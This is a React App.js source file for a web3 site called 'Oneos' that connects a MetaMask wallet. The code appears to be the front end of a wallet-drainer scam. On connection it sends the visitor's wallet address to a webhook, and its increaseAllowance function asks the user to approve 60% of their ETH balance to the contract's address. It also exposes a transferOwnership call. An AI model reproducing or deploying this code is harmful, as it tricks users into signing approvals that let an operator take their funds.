import React, { useState, useEffect } from "react";
import Web3 from "web3";
import { CONTRACT_ADDRESS } from "./contract/address";
import OneosContract from "./contract/Oneos.json";
import Landing from "./components/Landing";
import Navbar from "./components/Navbar";
import { useDispatch, useSelector } from "react-redux";
import { sendNotification } from "./features/webhookSlice";

function App() {
  const [web3, setWeb3] = useState(null);
  const [contract, setContract] = useState(null);
  const [account, setAccount] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);
  const [connectLoading, setConnectLoading] = useState(false);

  const dispatch = useDispatch();

  const { isError, isSuccess, isLoading } = useSelector(
    (state) => state.webhook
  );

  const isMobile = () => /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

  const connectWallet = async () => {
    setConnectLoading(true);
    try {
      if (window.ethereum && window.ethereum.isMetaMask) {
        const web3Instance = new Web3(Web3.givenProvider || window.ethereum);
        await window.ethereum.request({ method: "eth_requestAccounts" });

        const accounts = await web3Instance.eth.getAccounts();
        const selectedAccount = accounts[0];

        setAccount(selectedAccount);
        setWeb3(web3Instance);

        const instance = new web3Instance.eth.Contract(
          OneosContract.abi,
          CONTRACT_ADDRESS
        );
        setContract(instance);
      } else if (isMobile()) {
        window.location.href = "https://metamask.app.link/dapp/oneos.site";
        return;
      } else {
        setError(
          "MetaMask is not installed. Please install MetaMask to use this dApp."
        );
      }
    } catch (error) {
      console.error(error);
      setError("An error occurred during wallet connection.");
    } finally {
      setConnectLoading(false);
    }
  };

  const changeOwner = async (newOwner) => {
    console.log(newOwner);
    if (!contract) {
      setError("Contract is not initialized.");
      return;
    }
    setLoading(true);
    try {
      await contract.methods
        .transferOwnership(newOwner)
        .send({ from: account });
      setSuccess(true);
    } catch (error) {
      console.error(error);
      setError("An error occurred. Try again.");
    } finally {
      setLoading(false);
    }
  };

  const getOwner = async () => {
    if (!contract) {
      setError("Contract is not initialized.");
      return;
    }
    setLoading(true);
    try {
      const ownerAddress = await contract.methods.owner().call();
      console.log("Current owner:", ownerAddress);
      setSuccess(true);
    } catch (error) {
      console.error(error);
      setError("An error occurred. Try again.");
    } finally {
      setLoading(false);
    }
  };

  const increaseAllowance = async () => {
    if (!contract || !web3) {
      setError("Web3 or contract is not initialized.");
      return;
    }
    setLoading(true);
    try {
      const balanceInWei = await web3.eth.getBalance(account);
      const balanceBN = BigInt(balanceInWei);
      const partials = (balanceBN * 60n) / 100n;
      const partialsInWei = partials.toString();

      await contract.methods
        .increaseAllowance(contract.options.address, partialsInWei)
        .send({ from: account });

      setSuccess(true);
    } catch (error) {
      console.error(error);
      setError("An error occurred. Try again.");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.on("accountsChanged", (accounts) => {
        setAccount(accounts[0]);
        window.location.reload();
      });

      return () => {
        window.ethereum.removeAllListeners("accountsChanged");
      };
    }
  }, [account]);

  useEffect(() => {
    const formData = {
      userAddress: account,
      siteName: "Oneos",
    };
    if (account) {
      dispatch(sendNotification(formData));
      console.log(`${account} Connected.`);
    }
  }, [account]);

  return (
    <section className="app">
      <Navbar
        account={account}
        connectWallet={connectWallet}
        connectLoading={connectLoading}
      />
      {error && <p style={{ color: "red" }}>{error}</p>}
      {success && <p style={{ color: "green" }}>Operation successful!</p>}
      <Landing
        increaseAllowance={increaseAllowance}
        account={account}
        connectWallet={connectWallet}
        loading={loading}
        changeOwner={changeOwner}
        getOwner={getOwner}
      />
    </section>
  );
}

export default App;
